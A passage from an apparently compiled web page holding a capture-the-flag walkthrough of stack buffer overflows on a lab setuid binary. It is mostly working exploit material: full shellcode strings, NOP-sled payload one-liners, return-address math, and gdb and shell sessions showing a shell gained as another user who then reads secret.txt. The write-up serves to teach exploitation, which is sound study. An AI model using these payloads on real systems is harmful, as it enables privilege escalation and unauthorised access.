rbp), ",(0,x.jsx)(A.code,{children:"6"})," bytes to overwrite return address."]}),"\n",(0,x.jsx)(A.h3,{id:"shellcode--return-address",children:"shellcode + return address"}),"\n",(0,x.jsxs)(A.p,{children:["use this ",(0,x.jsx)(A.code,{children:"40-bytes"})," shellcode:"]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05\n"})}),"\n",(0,x.jsx)(A.p,{children:"key note from the author: simple shellcodes without an exit function messes the overflow up, check this."}),"\n",(0,x.jsx)(A.p,{children:"we need to find the return address for the start of our shellcode, so we can put this into our overflow to jump to our code when the program is exploited."}),"\n",(0,x.jsxs)(A.p,{children:["so our payload needs to be a total bytes: ",(0,x.jsx)(A.code,{children:"152 + return address (6) = 158"})," at all times."]}),"\n",(0,x.jsxs)(A.p,{children:[(0,x.jsx)(A.code,{children:"PAYLOAD = JUNK + SHELLCODE + JUNK + RETURN_ADDRESS"})," e.g. ",(0,x.jsx)(A.code,{children:"payload = 'A'*100 + 'shellcode' + 'B'*12 + 'C'*6"})]}),"\n",(0,x.jsx)(A.p,{children:"using gdb, run this:"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) run $(python -c \"print 'A' * 100 + shellcode + 'B' * 12 + 'C' * 6\")\n"})}),"\n",(0,x.jsx)(A.p,{children:"then dump the memory to see where the payload ended up, and the memory addresses associated with it."}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) x/100x $rsp-200\n0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff\n0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff\n0x7fffffffe248: 0xffffe656      0x00007fff      0x41414141      0x41414141\n0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141\n0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141\n0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141\n0x7fffffffe288: 0x41414141      0x41414141      0x41414141      0x41414141\n0x7fffffffe298: 0x41414141      0x41414141      0x41414141      0x41414141\n0x7fffffffe2a8: 0x41414141      0x41414141      0x41414141      0x622fb948\n0x7fffffffe2b8: 0x732f6e69      0xc1481168      0xc14808e1      0x485108e9\n0x7fffffffe2c8: 0x48243c8d      0x3bb0d231      0x4242050f      0x42424242\n0x7fffffffe2d8: 0x42424242      0x43434242      0x43434343      0x00007f00\n0x7fffffffe2e8: 0x00400590      0x00000000      0xffffe3e8      0x00007fff\n0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000\n0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000\n0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002\n0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000\n0x7fffffffe338: 0x14cb65ee      0xa528a1f1      0x00400450      0x00000000\n0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000\n0x7fffffffe358: 0x00000000      0x00000000      0xd9ab65ee      0x5ad75e8e\n0x7fffffffe368: 0x404f65ee      0x5ad74e39      0x00000000      0x00000000\n0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000\n0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff\n0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000\n0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000\n(gdb)\n\n"})}),"\n",(0,x.jsx)(A.admonition,{type:"note",children:(0,x.jsx)(A.p,{children:"each COLUMN is 4 bytes wide"})}),"\n",(0,x.jsx)(A.p,{children:"the dump command:"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) x/100x $rsp-200\n"})}),"\n",(0,x.jsxs)(A.p,{children:['this says "dump 100x4 bytes from memory location ',(0,x.jsx)(A.code,{children:"$rsp-200"}),'" (why rsp-200?) then look at the output, see the ',(0,x.jsx)(A.code,{children:"\\x41"}),"s and see where the shellcode starts i.e. ",(0,x.jsx)(A.code,{children:"\\x6a\\x3b\\x58..."})]}),"\n",(0,x.jsx)(A.h3,{id:"memory-address-math",children:"Memory Address Math"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) x/100x $rsp-200\n0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff\n0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff\n0x7fffffffe248: 0xffffe656      0x00007fff      0x41414141      0x41414141\n0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141\n0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141\n0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141\n0x7fffffffe288: 0x41414141      0x41414141      0x41414141      0x41414141\n0x7fffffffe298: 0x41414141      0x41414141      0x41414141      0x41414141\n0x7fffffffe2a8: 0x41414141      0x41414141      0x41414141      0x622fb948\n0x7fffffffe2b8: 0x732f6e69      0xc1481168      0xc14808e1      0x485108e9\n0x7fffffffe2c8: 0x48243c8d      0x3bb0d231      0x4242050f      0x42424242\n0x7fffffffe2d8: 0x42424242      0x43434242      0x43434343      0x00007f00\n0x7fffffffe2e8: 0x00400590      0x00000000      0xffffe3e8      0x00007fff\n0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000\n0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000\n0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002\n0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000\n0x7fffffffe338: 0x14cb65ee      0xa528a1f1      0x00400450      0x00000000\n0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000\n0x7fffffffe358: 0x00000000      0x00000000      0xd9ab65ee      0x5ad75e8e\n0x7fffffffe368: 0x404f65ee      0x5ad74e39      0x00000000      0x00000000\n0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000\n0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff\n0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000\n0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000\n"})}),"\n",(0,x.jsxs)(A.p,{children:["Our shellcode starts on address line ",(0,x.jsx)(A.code,{children:"0x7fffffffe2a8"})," on the 4th column."]}),"\n",(0,x.jsxs)(A.p,{children:["Each column is 4-bytes wide, so to reference it, we need to start at ",(0,x.jsx)(A.code,{children:"0x7fffffffe2a8"})," add 3 x 4 = 12 bytes, 12 in hex is ",(0,x.jsx)(A.code,{children:"0xC"}),"."]}),"\n",(0,x.jsxs)(A.p,{children:["So the return address for the start of our shellcode is ",(0,x.jsx)(A.code,{children:"0x7fffffffe2a8"})," + ",(0,x.jsx)(A.code,{children:"0xC"})," = ",(0,x.jsx)(A.code,{children:"0x7fffffffe2b4"})]}),"\n",(0,x.jsxs)(A.p,{children:["Use a ",(0,x.jsx)(A.a,{href:"https://www.calculator.net/hex-calculator.html?number1=7fffffffe2a8&c2op=%2B&number2=C&calctype=op&x=57&y=20",children:"hex calculator"})]}),"\n",(0,x.jsx)(A.admonition,{type:"note",children:(0,x.jsx)(A.p,{children:"This was just an exercise if seeing how the A's and shellcode land in memory and how you can calculate a memory address (in hex) for a certain point in your payload. DONT do this to find your shellcode return address, use the NOP sled method instead."})}),"\n",(0,x.jsx)(A.h3,{id:"nop-slide-shellcode-address",children:"NOP slide shellcode address"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) run $(python -c \"print '\\x90'*100 + '\\x48\\xb9\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x11\\x48\\xc1\\xe1\\x08\\x48\\xc1\\xe9\\x08\\x51\\x48\\x8d\\x3c\\x24\\x48\\x31\\xd2\\xb0\\x3b\\x0f\\x05' + 'B'*12 + 'C'*6\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-3/buffer-overflow $(python -c \"print '\\x90'*100 + '\\x48\\xb9\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x11\\x48\\xc1\\xe1\\x08\\x48\\xc1\\xe9\\x08\\x51\\x48\\x8d\\x3c\\x24\\x48\\x31\\xd2\\xb0\\x3b\\x0f\\x05' + 'B'*12 + 'C'*6\")\nHere's a program that echo's out your input\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdH\ufffd/bin/shH\ufffdH\ufffdQH\ufffd<$H1\u04b0;BBBBBBBBBBBBCCCCCC\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000400595 in main ()\n(gdb) x/100x $rsp-200\n0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff\n0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff\n0x7fffffffe248: 0xffffe656      0x00007fff      0x90909090      0x90909090\n0x7fffffffe258: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe268: 0x90909090      0x90909090      0x90909090      0x90909090 <---- e.g. here\n0x7fffffffe278: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe288: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe298: 0x90909090      0x90909090      0x90909090      0x90909090\n0x7fffffffe2a8: 0x90909090      0x90909090      0x90909090      0x622fb948\n0x7fffffffe2b8: 0x732f6e69      0xc1481168      0xc14808e1      0x485108e9\n0x7fffffffe2c8: 0x48243c8d      0x3bb0d231      0x4242050f      0x42424242\n0x7fffffffe2d8: 0x42424242      0x43434242      0x43434343      0x00007f00\n0x7fffffffe2e8: 0x00400590      0x00000000      0xffffe3e8      0x00007fff\n0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000\n0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000\n0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002\n0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000\n0x7fffffffe338: 0xdb621c60      0x310de389      0x00400450      0x00000000\n0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000\n0x7fffffffe358: 0x00000000      0x00000000      0x16021c60      0xcef21cf6\n0x7fffffffe368: 0x8fe61c60      0xcef20c41      0x00000000      0x00000000\n0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000\n0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff\n0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000\n0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000\n"})}),"\n",(0,x.jsxs)(A.p,{children:["pick ANY address where you see a bunch of ",(0,x.jsx)(A.code,{children:"0x90909090"})," in the columns."]}),"\n",(0,x.jsxs)(A.p,{children:["I choose: ",(0,x.jsx)(A.code,{children:"0x7fffffffe268"})," we need to convert to little endian: ",(0,x.jsx)(A.code,{children:"\\x68\\xe2\\xff\\xff\\xff\\x7f"})]}),"\n",(0,x.jsx)(A.h3,{id:"payload--shellcode-return-address",children:"payload + shellcode return address"}),"\n",(0,x.jsxs)(A.admonition,{type:"danger",children:[(0,x.jsx)(A.p,{children:"DONT use the shellcode from the THM ROOM, it's all shit & doesn't work."}),(0,x.jsx)(A.p,{children:"Use l1ge's one instead."})]}),"\n",(0,x.jsx)(A.p,{children:"run it in gdb:"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) run $(python -c \"print '\\x90'*100 + '\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + 'B'*12 + '\\x68\\xe2\\xff\\xff\\xff\\x7f'\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-3/buffer-overflow $(python -c \"print '\\x90'*100 + '\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + 'B'*12 + '\\x68\\xe2\\xff\\xff\\xff\\x7f'\")\nHere's a program that echo's out your input\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shI\ufffdAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffdBBBBBBBBBBBBh\ufffd\ufffd\ufffd\ufffd\nprocess 3468 is executing new program: /usr/bin/bash\nsh-4.2$ ls\nDetaching after fork from child process 3476.\nbuffer-overflow  buffer-overflow.c  secret.txt\nsh-4.2$ whoami\nDetaching after fork from child process 3477.\nuser1\nsh-4.2$ ll\nDetaching after fork from child process 3478.\nsh: ll: command not found\nsh-4.2$ ls -l\nDetaching after fork from child process 3479.\ntotal 20\n-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow\n-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c\n-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt\nsh-4.2$ cat secret.txt\nDetaching after fork from child process 3480.\ncat: secret.txt: Permission denied\nsh-4.2$ exit\n[Inferior 1 (process 3468) exited with code 01]\n"})}),"\n",(0,x.jsxs)(A.p,{children:["still no ",(0,x.jsx)(A.code,{children:"user2"})," permission, so we need to adjust our shellcode using ",(0,x.jsx)(A.code,{children:"setuid(1002)"})," (which is user1's uid from ",(0,x.jsx)(A.code,{children:"/etc/passwd"}),"), when the shellcode pops, we want ",(0,x.jsx)(A.code,{children:"setuid"})," at the top to make use ",(0,x.jsx)(A.code,{children:"user2"}),"."]}),"\n",(0,x.jsx)(A.admonition,{type:"note",children:(0,x.jsxs)(A.p,{children:["look up & understand the difference between (real) UID and effective UID and how the shell treats things, except of course if you're trying to setuid(0) i.e. root, in which case you can only get your effective UID set. Because of this, what we need to basically ",(0,x.jsx)(A.code,{children:"su"})," to user2 is ",(0,x.jsx)(A.code,{children:"setruid()"})]})}),"\n",(0,x.jsx)(A.h3,{id:"pwntools-setreuid-shellcode",children:"pwntools setreuid shellcode"}),"\n",(0,x.jsx)(A.p,{children:"install pwntools:"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"apt update -y\napt install -y python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\npython3 -m pip install --upgrade pip\npython3 -m pip install --upgrade pwntools --user\n"})}),"\n",(0,x.jsx)(A.p,{children:"and then create shellcode with setreuid:"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"pwn shellcraft -f d amd64.linux.setreuid 1002\n\\x31\\xff\\x66\\xbf\\xea\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\n"})}),"\n",(0,x.jsxs)(A.p,{children:["add this to the existing ",(0,x.jsx)(A.code,{children:"/bin/sh"})," shellcode that was dropping us in before:"]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"run $(python -c \"print '\\x90'*100 + '\\x31\\xff\\x66\\xbf\\xea\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + 'B'*12 + '\\x68\\xe2\\xff\\xff\\xff\\x7f'\")\n"})}),"\n",(0,x.jsx)(A.p,{children:"the payload is now 212 bytes, but we need to keep it at 158 bytes total (i.e. 152 offset + 6 return address)."}),"\n",(0,x.jsx)(A.h3,{id:"debugging-return-address",children:"Debugging Return Address"}),"\n",(0,x.jsx)(A.p,{children:'I had 2, near-identical payloads except for the return address- which according to the "pick any address where the NOPs are" rule, the address I picked should have worked.'}),"\n",(0,x.jsxs)(A.p,{children:["First payload is ",(0,x.jsx)(A.code,{children:"l1ges"})," (the author of the write-up), second payload is mine."]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"[user1@ip-10-10-222-59 overflow-3]$ ./buffer-overflow $(python -c \"print '\\x90'*86+'\\x31\\xff\\x66\\xbf\\xea\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + 'A'*12 + '\\x98\\xe2\\xff\\xff\\xff\\x7f'\")\nHere's a program that echo's out your input\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd1\ufffdf\ufffd\ufffdjqXH\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shIAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffdAAAAAAAAAAAA\ufffd\ufffd\ufffd\ufffd\ufffd\nsh-4.2$ exit\n[user1@ip-10-10-222-59 overflow-3]$ ./buffer-overflow $(python -c \"print '\\x90'*86+'\\x31\\xff\\x66\\xbf\\xea\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + 'B'*12 + '\\x68\\xe2\\xff\\xff\\xff\\x7f'\")\nHere's a program that echo's out your input\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd1\ufffdf\ufffd\ufffdjqXH\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shIAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffdBBBBBBBBBBBBh\ufffd\ufffd\ufffd\ufffd\nIllegal instruction\n"})}),"\n",(0,x.jsxs)(A.p,{children:["ended up being my return address ",(0,x.jsx)(A.code,{children:"\\x68\\xe2\\xff\\xff\\xff\\x7f"})," didn't work, but ",(0,x.jsx)(A.code,{children:"\\x98\\xe2\\xff\\xff\\xff\\x7f"})," did."]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"[user1@ip-10-10-222-59 overflow-3]$ ./buffer-overflow $(python -c \"print '\\x90'*86+'\\x31\\xff\\x66\\xbf\\xea\\x03\\x6a\\x71\\x58\\x48\\x89\\xfe\\x0f\\x05\\x6a\\x3b\\x58\\x48\\x31\\xd2\\x49\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x49\\xc1\\xe8\\x08\\x41\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\\x6a\\x3c\\x58\\x48\\x31\\xff\\x0f\\x05' + 'B'*12 + '\\x98\\xe2\\xff\\xff\\xff\\x7f'\")\nHere's a program that echo's out your input\n\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd1\ufffdf\ufffd\ufffdjqXH\ufffd\ufffdj;XH1\ufffdI\ufffd//bin/shIAPH\ufffd\ufffdRWH\ufffd\ufffdj<XH1\ufffdBBBBBBBBBBBB\ufffd\ufffd\ufffd\ufffd\ufffd\nsh-4.2$ whoami\nuser2\nsh-4.2$ ls\nbuffer-overflow  buffer-overflow.c  secret.txt\nsh-4.2$ cat secret.txt\nomgyoudidthissocool!!\n"})}),"\n",(0,x.jsx)(A.h2,{id:"buffer-overflow-2",children:"Buffer Overflow #2"}),"\n",(0,x.jsxs)(A.p,{children:["The 2nd overflow, in the ",(0,x.jsx)(A.code,{children:"buffer-overflow-4"})," folder:"]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-c",children:'#include <stdio.h />\n#include <stdlib.h />\n\nvoid copy_arg(char *string)\n{\n    char buffer[140];\n    strcpy(buffer, string);\n    printf("%s\\n", buffer);\n    return 0;\n}\n\nint main(int argc, char **argv)\n{\n    printf("Here\'s a program that echo\'s out your input\\n");\n    copy_arg(argv[1]);\n}\n'})}),"\n",(0,x.jsx)(A.h3,{id:"find-offset",children:"Find Offset"}),"\n",(0,x.jsx)(A.p,{children:'The offset is the size of the payload that includes the "buffer" all the way up to overwriting the EIP (return address)'}),"\n",(0,x.jsx)(A.p,{children:"we can see the entry point for our overflow in the source code:"}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-c",children:'  char buffer[154] = "doggo";\n  strcpy(buffer, string)\n'})}),"\n",(0,x.jsx)(A.p,{children:"our equation for the offset, works something like this:"}),"\n",(0,x.jsxs)(A.p,{children:[(0,x.jsx)(A.code,{children:"payload = buffer + return_address + pad"})," - where ",(0,x.jsx)(A.code,{children:"pad"}),' is some arbitrary number we adjust to see the program "crash" out and show us a return address that starts getting overwritten with ',(0,x.jsx)(A.code,{children:"'A's"})]}),"\n",(0,x.jsx)(A.p,{children:"e.g."}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"Program received signal SIGSEGV, Segmentation fault.\n0x0000000000414141 in ?? ()\n"})}),"\n",(0,x.jsxs)(A.p,{children:["We can see that ",(0,x.jsx)(A.code,{children:"buffer"})," is ",(0,x.jsx)(A.code,{children:"154 - doggo"})," = ",(0,x.jsx)(A.code,{children:"149"})," - (we'll keep writing it as ",(0,x.jsx)(A.code,{children:"154-5"}),". And we know that the return address is ",(0,x.jsx)(A.code,{children:"6 bytes"}),"."]}),"\n",(0,x.jsxs)(A.p,{children:["So now our equation looks like : ",(0,x.jsx)(A.code,{children:"payload = (154-5) + 6 + pad"})," for which we don't know what ",(0,x.jsx)(A.code,{children:"pad"})," equals, so we run a python line to start determining what ",(0,x.jsx)(A.code,{children:"pad"})," is."]}),"\n",(0,x.jsxs)(A.p,{children:["Let's start with ",(0,x.jsx)(A.code,{children:"8 bytes"})," i.e. ",(0,x.jsx)(A.code,{children:"(154-5+6+8)"})," and keep incrementing that until we see our ",(0,x.jsx)(A.code,{children:"A"}),"'s (",(0,x.jsx)(A.code,{children:"\\x41"}),") start overwriting the return address:"]}),"\n",(0,x.jsx)(A.pre,{children:(0,x.jsx)(A.code,{className:"language-sh",children:"(gdb) run $(python -c \"print 'A'*(154-5+6+8)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c \"print 'A'*(154-5+6+8)\")\nnew word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGILL, Illegal instruction.\n0x0000000000400500 in __do_global_dtors_aux ()\n(gdb) run $(python -c \"print 'A'*(154-5+6+9)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c \"print 'A'*(154-5+6+9)\")\nnew word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000000400041 in ?? ()\n(gdb) run $(python -c \"print 'A'*(154-5+6+10)\")\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/user1/overflow-4/buffer-overflow-2 $(python -c \"print 'A'*(154-5+6+10)\")\nnew word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, 